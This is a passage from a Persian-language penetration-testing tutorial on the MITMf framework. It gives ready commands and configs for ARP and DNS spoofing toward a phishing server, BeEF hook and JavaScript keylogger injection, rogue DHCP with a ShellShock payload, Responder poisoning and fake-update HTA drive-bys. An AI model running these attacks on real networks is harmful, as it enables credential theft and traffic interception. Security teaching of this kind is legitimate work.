#کپی فایل پیکربندی پیش‌فرض
sudo cp /usr/share/mitmf/config/mitmf.conf /etc/mitmf/mitmf.conf

#ویرایش تنظیمات
sudo nano /etc/mitmf/mitmf.conf
```

###### `mitmf.conf` Main Configuration Parameters
در فایل `mitmf.conf` بخش های مختلفی وجود دارد که نام هر بخش درون `[]` قرار میگیرد، مثلا `[ARP] , [DNS] , [HTTP] , ...` همگی تعدادی از بخش های این فایل تنظیمات هستند. هر بخش از تنظیمات نیز پارامتر های مخصوص خود را دارد که رفتار مربوط به آن بخش را شخصی سازی میکند.

- نمونه ای کامل از فایل `mitmf.conf` را در کد بلاک زیر مشاهده میکنید:
```sh
[MITMf]
#General Settings (تنظیمات عمومی)
interface = eth0
log_level = INFO
log_dir = /var/log/mitmf/

[ARP]
#ARP Spoofing Configuration (تنظیمات ARP Spoofing)
interval = 3
mode = rep

[DNS]
#DNS Spoofing Configuration (تنظیمات جعل DNS)
dns_file = /etc/mitmf/dns.conf

[HTTP]
#HTTP Proxy Configuration (تنظیمات پراکسی HTTP)
port = 8080

[BeEF]
#BeEF Connection Settings (تنظیمات اتصال به BeEF)
beef_url = http://127.0.0.1:3000/hook.js
```

- **پارامترهای قابل تنظیم در هر بخش:**

|    بخش    |   پارامتر   |          کاربرد          |          مقادیر قابل قبول           |
| :-------: | :---------: | :----------------------: | :---------------------------------: |
| `[MITMf]` | `interface` |     اینترفیس پیش‌فرض     |           `eth0`, `wlan0`           |
| `[MITMf]` | `log_level` |      سطح جزئیات لاگ      | `DEBUG`, `INFO`, `WARNING`, `ERROR` |
| `[MITMf]` |  `log_dir`  | دایرکتوری محل ذخیره لاگ  |          `/var/log/mitmf/`          |
|  `[ARP]`  | `interval`  | فاصله ARP Poison (ثانیه) |             `1` تا `10`             |
|  `[ARP]`  |   `mode`    |    حالت ARP Spoofing     | یا `rep` (Reply) یا `req` (Request) |
|  `[DNS]`  | `dns_file`  |  مسیر فایل پیکربندی DNS  |           مسیر مطلق فایل            |
| `[HTTP]`  |   `port`    |     پورت پراکسی HTTP     |          `8080` (پیش‌فرض)           |
| `[BeEF]`  | `beef_url`  |      آدرس هوک BeEF       |            آدرس URL کامل            |

- **استفاده از فایل پیکربندی سفارشی:**
	- در نهایت برای اجرای MITMf با فایل پیکربندی سفارشی هم از فلگ `c-` استفاده میکنیم:
```sh
sudo python3 mitmf.py -c /etc/mitmf/mitmf.conf
```

- در لینک زیر میتوانید یک نسخه کامل از این فایل پیکربندی را بصورت کامل مشاهده کنید. این فایل که دارای بیش از 500 خط کانفیگ است نسخه ای کامل از `mitmf.conf` که توسط GabrielePicco ارائه شده است:
	- https://github.com/GabrielePicco/MITMf/blob/master/config/mitmf.conf
###### `dns.conf` DNS Configuration
فایل `dns.conf` تنظیمات ماژول جعل DNS در MITMf است. این فایل به ما اجازه می‌دهد تا مشخص کنیم کدام دامنه‌ها باید به کدام آدرس‌های IP هدایت شوند. با ویرایش این فایل، می‌توانیم سناریوهای متنوعی از فیشینگ هدفمند گرفته تا مسدودسازی دسترسی را پیاده‌سازی کنیم.

- **محل قرارگیری فایل:**
	- به‌طور پیش‌فرض، MITMf انتظار دارد این فایل در یکی از مسیرهای زیر قرار داشته باشد:
	- `/etc/mitmf/dns.conf` (مسیر سیستمی)
	- `/usr/share/mitmf/config/dns.conf` (مسیر نصب)
	- البته می‌توانیم با استفاده از فلگ `dns-file--` مسیر دلخواه خود را برای بارگذاری `dns.conf` به MITMf معرفی کنیم.

- **ساختار و قواعد نوشتن:**
	- ساختار این فایل بسیار ساده و در عین حال قدرتمند است. هر خط از فایل شامل یک قانون جعل DNS است که از سه بخش تشکیل می‌شود:
	- `<Domain Template>    <Record Type>    <Destination Address>`
	- `<قالب دامنه>    <نوع رکورد>    <آدرس مقصد>`

- **بخش‌های تشکیل‌دهنده:**

| بخش         | توضیح                                                            | مثال                                 |
| ----------- | ---------------------------------------------------------------- | ------------------------------------ |
| الگوی دامنه | دامنه یا الگویی که باید جعل شود. می‌تواند دقیق یا Wildcard باشد. | `www.facebook.com` یا `*.google.com` |
| نوع رکورد   | نوع رکورد DNS که باید جعل شود. معمولاً `A` برای IPv4.            | `A`، `AAAA`، `PTR`، `MX`             |
| آدرس مقصد   | آدرس IP که به جای آدرس واقعی بازگردانده می‌شود.                  | `192.168.1.99`                       |

- **قواعد Wildcard:**
	- `*` به معنای "هر رشته‌ای" است. برای مثال:
		- `*.example.com` تمام زیردامنه های درون `example.com` 
	- `*` به تنهایی، تمام دامنه‌ها را هدف قرار می‌دهد.
		- `www.google.*` تمام دامنه‌های سطح بالای گوگل را شامل میشود (`.com`, `.fr`, `.ir`)

- **نمونه فایل `dns.conf`:**
	- در ادامه، یک فایل نمونه کامل را مشاهده می‌کنیم که سناریوهای مختلفی را پوشش می‌دهد:
```sh
#============================================================
#فایل پیکربندی جعل DNS برای MITMf
#مسیر: /etc/mitmf/dns.conf
#============================================================

#--- سناریو 1: فیشینگ هدفمند شبکه‌های اجتماعی ---
#هدایت تمام ترافیک فیسبوک به سرور فیشینگ ما
*.facebook.com       A   192.168.1.99
*.fbcdn.net          A   192.168.1.99
*.facebook.net       A   192.168.1.99

#هدایت توییتر و اینستاگرام
*.twitter.com        A   192.168.1.99
*.instagram.com      A   192.168.1.99

#--- سناریو 2: مسدودسازی محتوای خاص ---
#بازگرداندن 127.0.0.1 برای دامنه‌های مسدود 
*.gambling-site.com  A   127.0.0.1
*.malware-cdn.net    A   127.0.0.1

#--- سناریو 3: جعل جستجوی گوگل ---
#تمام دامنه‌های گوگل در تمام کشورها
www.google.*         A   192.168.1.99
*.google.com         A   192.168.1.99

#--- سناریو 4: هدایت تمام آدرس ها به یک سرور ---
#همه چیز به یک سرور هدایت شود
*                  A   192.168.1.99
```

- **نحوه استفاده:**
	- پس از ایجاد و ویرایش فایل `dns.conf`، آن را با فلگ `dns-file--` به MITMf معرفی می‌کنیم:
```sh
#روش اول: استفاده از مسیر کامل فایل
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --dns --dns-file /etc/mitmf/dns.conf -i eth0

#روش دوم: اگر فایل در مسیر پیش‌فرض باشد، فقط ماژول را فعال کنیم
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --dns -i eth0
```

- **تست و عیب‌یابی:**
	- برای اطمینان از عملکرد صحیح DNS Spoofing، می‌توانیم از ابزار `dig` یا `nslookup` روی دستگاه هدف استفاده کنیم.
	- نکته: از این روش برای شناسایی سرور DNS مخرب هم استفاده میشود.
```sh
#اجرا روی دستگاه هدف (یا شبیه‌سازی)
dig @192.168.1.1 www.facebook.com
#اگر جعل موفق باشد، پاسخ باید 192.168.1.99 باشد

nslookup www.facebook.com
#باید آیپی سرور فیشینگ ما را نشان دهد
```

- **نکات مهم:**
	1. **مسیر فایل:** همیشه از مسیر مطلق استفاده کنیم تا از خطاهای احتمالی جلوگیری شود.  
	2. **استفاده از Wildcard:** استفاده از `*` به تنهایی (برای هدایت تمام ترافیک) بسیار خطرناک است و ممکن است باعث اختلال کامل در شبکه شود.  
	3. **ترکیب با وب سرور:** قبل از شروع جعل حتماً یک وب سرور روی آدرس IP مقصد (در این مثال `192.168.1.99`) راه‌اندازی کنید.
	4. **تست در محیط ایزوله:** قبل از اجرا در شبکه واقعی، تنظیمات را در محیط آزمایشگاهی تست کنید.
###### DHCP Configuration
وقتیکه حملات DHCP Spoofing در MITMf اجرا میشوند مقادیر IP Pool و Subnet از فایل کانفیگ اصلی `mitmf.conf` و بخش مربوط خوانده میشوند. حملاتی مانند:
```sh
python mitmf.py -i eth0 --spoof --dhcp
```

برای تنظیم این مقادیر باید در فایل `config/mitmf.conf` و در بخش `[MITMf]` و زیربخش `[[DHCP]]` پارامترهای `pool` و `subnet` را برای تعیین محدوده IPهای واگذار شونده تنظیم کنیم:
```sh
#File: config/mitmf.conf

[MITMf]
    [[DHCP]]
        pool = 192.168.1.100
        subnet = 255.255.255.0
```
###### Other Configuration Files
در زیر سایر دایرکتوری ها و فایل های کانفیگ MITMf را معرفی میکنیم تا درصورت نیاز بتوانید از آنها در سناریو های خاص استفاده کنید.
1. **دایرکتوری اول:** `config/responder`
- **کاربرد:** این پوشه حاوی تنظیمات و فایل‌های سرویس‌دهنده برای پلاگین Responder است که ابزاری قدرتمند برای مسموم‌سازی پروتکل‌های LLMNR، NBT-NS و MDNS است و وظیفه بدست آوردن اطلاعات احراز هویت ویندوز را دارد.
    
- **روش کانفیگ و استفاده:**
	1. **فایل‌های اصلی:** مهم‌ترین فایل در این پوشه `Responder.conf` است. در این فایل می‌توانیم سرویس‌های مختلف (مانند HTTP، SMB، SQL و غیره) را که می‌خواهیم Responder برای آن‌ها پاسخ جعلی ارسال کند، فعال یا غیرفعال کنیم.
	2. **سایر فایل ها:**
		1. `AccessDenied.html`
		2. `BindShell.exe`
		3. `gen-self-signed-cert.sh`
		4. `responder.crt`
		5. `responder.key`
        
- **شروع حمله:** برای اجرای Responder همراه با MITMf، از فلگ‌های مخصوص آن استفاده می‌کنیم:
```sh
python mitmf.py -i eth0 --responder --wredir --nbtns
```
این دستور، مسموم‌سازی LLMNR و NetBIOS را فعال کرده و یک سرور WPAD جعلی نیز راه‌اندازی می‌کند.

2. **دایرکتوری دوم:** `config/hta_driveby`
- **کاربرد:** این پوشه مخصوص پلاگین HTA Drive-By است. این پلاگین یک حمله مهندسی اجتماعی قدرتمند را با نمایش یک اعلان به‌روزرسانی جعلی (مثلاً برای Adobe Flash) در مرورگر قربانی پیاده‌سازی می‌کند. هدف، ترغیب کاربر به دانلود و اجرای یک فایل HTA (HTML Application) است که می‌تواند کدهای مخرب را روی سیستم ویندوز اجرا کند.
    
- **روش کانفیگ و استفاده:**
    1. **فایل `index.html`:** این فایل، قالب صفحه جعلی به‌روزرسانی است که به کاربر نشان داده می‌شود.
	2. **فایل‌های نمونه:** معمولاً شامل یک فایل `.hta` نمونه است که می‌توانیم آن را با payload مخرب خود (مثلاً یک reverse shell) جایگزین کنیم.
        
- **شروع حمله:**
```sh
python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --hta
```
با این دستور، هرگاه کاربر سعی کند یک وب‌سایت را باز کند، صفحه جعلی به‌روزرسانی به او نشان داده می‌شود.

3. **دایرکتوری سوم:** `config/app_cache_poison_templates`
- **کاربرد:** این پوشه شامل قالب‌هایی برای پلاگین AppCachePoison است. این پلاگین یک حمله پیشرفته است که از قابلیت HTML5 App Cache مرورگرها سوءاستفاده می‌کند تا کد مخرب را به‌طور دائمی روی مرورگر قربانی ذخیره کند. حتی اگر کاربر بعداً به صورت آفلاین هم باشد، کد مخرب اجرا خواهد شد.
    
- **روش کانفیگ و استفاده:**
    1. **فایل `append.`:** این فایل قلب حمله است. در این فایل تکه کد هایی که باید به هدف اضافه شود را مشخص میکنیم.
    2. **فایل `manifest.`** در این فایل مشخص فایل append با چه قوانینی به هدف اضافه شود، مثلا در هر دو پروتکل HTTP, HTTPS تزریق شود یا در Network خاصی این تزریق انجام شود.

- **شروع حمله:** برای اجرای این حمله، کافی است پلاگین مربوطه را فعال کنیم:
```sh
python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --appoison
```

**نکته پایانی:** تمامی این فایل‌های کانفیگ، انعطاف‌پذیری فوق‌العاده‌ای به MITMf می‌بخشند. برای تبدیل شدن به یک کاربر حرفه‌ای، بررسی و شخصی‌سازی این قالب‌ها و فایل‌های `conf.` برای هر سناریوی تست نفوذ، امری ضروری است.
##### Implement Common Attacks with MITMf
###### Attack 1: Basic ARP Spoofing with HTTP Sniffing
- **توضیحات:**
	- **توضیح حمله:**  
		- در این حمله، خود را بین هدف و گیت‌وی قرار داده و ترافیک HTTP او را مشاهده می‌کنیم.
	- **مکانیزم:**  
		- ابزار MITMf بسته‌های ARP Reply جعلی به هدف و گیت‌وی ارسال می‌کند و سپس ترافیک عبوری را تحلیل می‌نماید.
	- **سناریو استفاده:** 
		1. ارزیابی اولیه امنیت شبکه و شناسایی اطلاعات حساسی که به صورت Plain Text(متن شفاف) منتقل می‌شوند.

**روش پیاده‌سازی گام‌به‌گام**
1. **مرحله اول:** فعالسازی IP Forwarding
```sh
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

2. **مرحله دوم:** اجرای حمله ARP Spoofing با MITMf
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 -i eth0
#                     ↑ حمله ARP    ↑ ضروری   ↑ IP گیت‌وی         ↑ IP هدف        ↑ اینترفیس
```
- پارامتر ها:
	- استفاده از `arp--` و `spoof--` نوع حمله ARP Spoofing را مشخص میکند.
	-  پارامتر `gateway--` وآیپی روبروی آن مشخص کننده مقصدی است که ترافیک به سمت آن هدایت میشود.
	- هدف حمله `192.168.1.10` است که ترافیک آن به گیت‌وی `192.168.1.1` هدایت میشود.

###### Attack 2: ARP Spoofing + BeEF Hook Injection
- **توضیحات:**
	- **توضیح حمله:**  
		- در این حمله علاوه بر قرارگیری در مسیر ترافیک، BeEF Hook را به تمام صفحات وب تزریق می‌کنیم تا کنترل کامل مرورگر هدف را به دست گیریم.
	- **مکانیزم:**  
		- ابزار MITMf پس از اجرای ARP Spoofing، کد جاوا اسکریپت BeEF را به انتهای هر پاسخ HTTP اضافه می‌کند.
	- **سناریو استفاده:** 
		1. تست نفوذ پیشرفته که در آن به کنترل مرورگر هدف برای اجرای دستورات پیچیده‌تر نیاز داریم.

**روش پیاده‌سازی گام‌به‌گام**
1. **مرحله اول:** راه اندازی BeEF 
```sh
sudo beef-xss &
```
- پس از اجرای BeEF با باز کردن http://127.0.0.1:3000/ui/panel میتوانیم به پنل BeEF دسترسی داشته باشیم:
	- Username: beef
	- Password: beef

2. **مرحله دوم:** اجرای MITMf با Beef Hook Injection
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 --inject --beef-hook -i eth0
```

3. **مرحله سوم:** با ورود به پنل BeEF مرورگر هدف در پنل BeEF ظاهر می‌شود و میتوانیم کنترل مرورگر هدف را بدست بگیریم.

###### Attack 3: DNS Spoofing + Phishing
- **توضیحات:**
	- **توضیح حمله:**  
		- با جعل پاسخ‌های DNS، هدف را به جای وب‌سایت اصلی، به سرور فیشینگ خود هدایت می‌کنیم.
	- **مکانیزم:**  
		- ابزار MITMf با استفاده از پلاگین `dns--`، به درخواست‌های DNS هدف پاسخ جعلی می‌دهد و او را به IP دلخواه ما هدایت می‌کند.
	- **سناریو استفاده:** 
		1. شبیه‌سازی حمله فیشینگ برای ارزیابی آگاهی امنیتی کارکنان.

**روش پیاده‌سازی گام‌به‌گام**
1. **مرحله اول:** ایجاد فایل پیکربندی DNS
```sh
cat > /root/dns_spoof.conf << 'EOF'
# Redirect social media to our phishing server
*.facebook.com   A   192.168.1.99
*.twitter.com    A   192.168.1.99
www.google.com   A   192.168.1.99
EOF
```

2. **مرحله دوم:** راه‌اندازی وب سرور فیشینگ با پایتون
```sh
sudo python3 -m http.server 80 -d /var/www/phishing &
```

3. **مرحله سوم:** اجرای MITMf با جعل DNS
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 --dns --dns-file /root/dns_spoof.conf -i eth0
```

###### Attack 4: Full Combination(ARP Spoofing + BeEF + Keylogger + DNS Spoofing)
- **توضیحات:**
	- **توضیح حمله:**  
		- حملات قبلی را به صورت همزمان ترکیب می‌کنیم تا یک حمله MITM کامل و پیشرفته داشته باشیم.
	- **سناریو استفاده:** 
		- ارزیابی جامع امنیتی که در آن نیاز به جمع‌آوری اطلاعات از چندین لایه مختلف داریم.

- **روش پیاده‌سازی:**
```sh
sudo python3 mitmf.py \
    --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 \
    --inject --beef-hook \
    --jskeylogger \
    --dns --dns-file /root/dns_spoof.conf \
    -i eth0 --log-level DEBUG
```
- با این خط همه قابلیت‌ها همزمان فعال میشوند.

###### Attack 5: DHCP Spoofing for New Clients
- **توضیحات:**
	- **توضیح حمله:**  
		- این حمله برای دستگاه‌هایی که تازه به شبکه متصل می‌شوند، یک سرور DHCP جعلی راه‌اندازی می‌کند.
	- **مکانیزم:**  
		- ابزار MITMf به درخواست‌های DHCP Discover سریع‌تر از سرور اصلی پاسخ داده و DNS Server را بر روی IP مهاجم تنظیم می‌کند.
	- **سناریو استفاده:** 
		1. راه اندازی DHCP Server جعلی و تحمیل IP, DNS, Default Gateway بر روی دستگاه تارگت

**روش پیاده‌سازی گام‌به‌گام**
1. **مرحله اول:** 
```sh
sudo python3 mitmf.py --dhcp --dhcp-dns 192.168.1.99 -i eth0
```

###### Attack 6: Capture Traffic in PCAP File
- **توضیحات:**
	- **توضیح حمله:**  
		- تمام ترافیک رهگیری‌شده را برای تحلیل آفلاین با Wireshark یا tcpdump ذخیره می‌کنیم.

**روش پیاده‌سازی گام‌به‌گام**
1. **مرحله اول:** 
```sh
sudo python3 mitmf.py --arp --spoof --gateway 192.168.1.1 --targets 192.168.1.10 --pcap /tmp/capture.pcap -i eth0
#traffic saved to a PCAP File (/tmp/capture.pcap)
```

2. **مرحله دوم:** تحلیل با Wireshark
```sh
wireshark /tmp/capture.pcap
```

##### MITMf Attacks Cheat Sheet
در زیر اکثر استفاده هایی که میتوانیم از MITMf انجام دهیم را بصورت خلاصه آوردیم تا بتوانید به عنوان مرجع از آن استفاده کنید.
1. بیشترین حالت استفاده، اجرای HTTP proxy SMB,DNS,HTTP servers و Net-Creds روی اینترفیس eth0
```sh
#1: The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface enp3s0:
python mitmf.py -i eth0
```

2. اجرای ARP Poison برروی تمام IP های درون یک Subnet با گیت‌وی 192.168.1.1 بوسیله پلاگین Spoof
```sh
#2: ARP poison the whole subnet with the gateway at 192.168.1.1 using the Spoof plugin:
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1
```

3. مانند مثال دوم به علاوه WPAD rogue proxy server با استفاده از پلاگین Responder
```sh
#Same as example 2 + a WPAD rogue proxy server using the Responder plugin:
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --responder --wpad
```

4. اجرای ARP Poison بر روی 192.168.1.16 تا 192.168.1.45 به علاوه تمام آیپی های درون ساب‌نت 192.168.0.1/24 با گیت‌وی 192.168.1.1
```sh
#ARP poison 192.168.1.16-45 and 192.168.0.1/24 with the gateway at 192.168.1.1:
python mitmf.py -i enp3s0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1
```

5. فعالسازی DNS Spoofing همزمان با اجرای ARP Poisoning(دامنه هایی که باید Spoof شوند از فایل کانفیگ بارگذاری میشوند)
```sh
#Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):
python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1
```

6. اجرای حمله جعل LLMNR/NBTNS/MDNS Spoofing:
```sh
#Enable LLMNR/NBTNS/MDNS spoofing:
python mitmf.py -i enp3s0 --responder --wredir --nbtns
```

7. اجرای DHCP Spoofing (مقادیر IP Pool و Subnet که باید بر روی اهداف تنظیم شود از فایل کانفیگ بارگذاری میشوند)
```sh
#Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):
python mitmf.py -i enp3s0 --spoof --dhcp
```

8. اجرای DHCP Spoofing به همراه استفاده از ShellShok Payload که اگر سیستمی آسیب پذیر باشد در آن اجرا میشود.
```sh
#Same as above with a ShellShock payload that will be executed if any client is vulnerable:
python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'
```

9. تزریق HTML IFrame با استفاده از پلاگین Inject روش HTML URL
```sh
#Inject an HTML IFrame using the Inject plugin:
python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com
```

10. تزریق جاوا اسکریپت با استفاده از پلاگین Inject روش JS URL
```sh
#Inject a JS script:
python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js
```

11. اجرای captive portal و هدایت تمامی ترافیک به سرور دلخواه (http://SERVER/PATH)
```sh
#Start a captive portal that redirects everything to http://SERVER/PATH
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portalurl http://SERVER/PATH
```

12. اجرای captive portal در آدرس http://your-ip/portal.html با استفاده از صفحه اصلی `portal.html` و یک فایل EXE (فایل اجرایی باید در دایرکتوری config/captive تنظیم شود)
```sh
#Start captive portal at http://your-ip/portal.html from the config/captive folder: (using default page /portal.html (thx responder) and /CaptiveClient.exe (not included)
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive
```

13. اجرای captive portal مانند مثال قبلی با این تفاوت که از Hostname بجای IP استفاده شده است (برای اینکار استفاده از `captive.portal` الزامیست، زیرا hostname باید به ip تبدیل شود)
```sh
#Same as above but with hostname captive.portal instead of IP (requires captive.portal to resolve to your IP, e.g. via DNS spoof):
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --use-dns
```

14. اجرای captive portal با استفاده از HTTP Server پایتون (`SimpleHTTPServer`) و Serve دایرکتوری دلخواه LOCALDIR (پورت HTTP Server را در فایل `mitmf.config` میتوان تغییر داد.)
```sh
#Serve a captive portal with an additional SimpleHTTPServer instance serving the LOCALDIR at http://IP:8080 change port in mitmf.config:
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portaldir LOCALDIR
```

15. اجرای captive portal با `SimpleHTTPServer` پایتون و استفاده از Hostname بجای IP
```sh
#Same as above but with hostname:
python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --portaldir LOCALDIR --use-dns
```

این موارد تنها روش های پراستفاده MITMf بودند و این چهارچوب توانایی های بسیار بیشتری نسبت به موارد بالا را نیز دارد. مثلا میتوانید چندین پلاگین را باهم ترکیب کنید (ARP spoof + inject + Responder و ..).  اگر موردی را مد نظر داشتید که در لیست بالا نبود، برای مشاهده لیست کاملی از گزینه های موجود از `python mitmf.py --help` استفاده کنید.
##### Conclusion
- چارچوبی برای درک قدرت تزریق
در این فصل، ما با یکی از تأثیرگذارترین چارچوب‌های تاریخ حملات مرد میانی آشنا شدیم. MITMf با فلسفه "یک چارچوب، تمام نیازها" به ما آموخت که چگونه می‌توان چندین حمله پیچیده را با یک خط کامند ترکیب کرد و به نتایج شگفت‌ انگیزی دست یافت. از ARP Spoofing و جعل DNS گرفته تا تزریق کدهای جاوااسکریپت، HTML و هوک‌های BeEF، همگی در یک ساختار منسجم و ساده در دسترس ما قرار گرفتند.

**با تسلط بر مباحث این فصل، اکنون می‌توانیم:**
- **ترکیب حملات را درک کنیم:** بیاموزیم که چگونه ARP Spoofing، DNS Spoofing و تزریق کد می‌توانند در یک زنجیره هماهنگ عمل کنند.
- **قدرت تزریق محتوا را بشناسیم:** با انواع روش‌های تزریق (فایل، URL، BeEF، HTML) و کاربرد هر یک را آموختیم.
- **سناریوهای واقعی را شبیه‌سازی کنیم:** از فیشینگ هدفمند با جعل DNS تا کنترل کامل مرورگر با BeEF، تمامی این سناریوها را در محیط آزمایشگاهی پیاده‌سازی نماییم.
- **محدودیت‌های ابزارهای کلاسیک را ببینیم:** درک کنیم که چرا توقف توسعه یک ابزار، به معنای پایان ارزش آموزشی آن نیست.

اما فراتر از مهارت‌های فنی، مهم‌ترین درسی که از MITMf می‌گیریم، **درک عمیق‌تر از تهدیدات** است. وقتی می‌بینیم چگونه یک مهاجم می‌تواند با یک خط کامند، صفحه ورود فیسبوک را با یک نسخه جعلی جایگزین کند، یا تمام کلیدهای فشرده‌شده کاربر را ثبت نماید، آن‌گاه است که اهمیت رمزنگاری، HTTPS و آگاهی امنیتی را به‌طور ملموس درک می‌کنیم.

به یاد داشته باشیم که این دانش، **مسئولیتی بزرگ** بر دوش ما می‌گذارد. MITMf ابزاری است که قدرت تخریب بالایی دارد، اما در دستان یک متخصص اخلاق‌مدار، به قدرتمندترین سلاح برای **دفاع از شبکه‌ها** تبدیل می‌شود. تمامی سناریوهایی که در این فصل بررسی کردیم، **صرفاً جنبه آموزشی** داشته و برای استفاده در **محیط‌های آزمایشگاهی ایزوله** طراحی شده‌اند. هدف ما از یادگیری این تکنیک‌ها، درک تهدیدات برای ساختن سامانه‌های امن‌تر است، نه نفوذ به حریم دیگران.

در فصل بعد، با نسل جدیدی از ابزارهای MITM آشنا خواهیم شد که راه MITMf را ادامه داده‌اند و آن را به سطح جدیدی از کارایی و انعطاف‌پذیری رسانده‌اند. اما پایه‌ای که در این فصل ساختیم، چراغ راه ما برای درک آن ابزارهای پیشرفته‌تر خواهد بود.

### !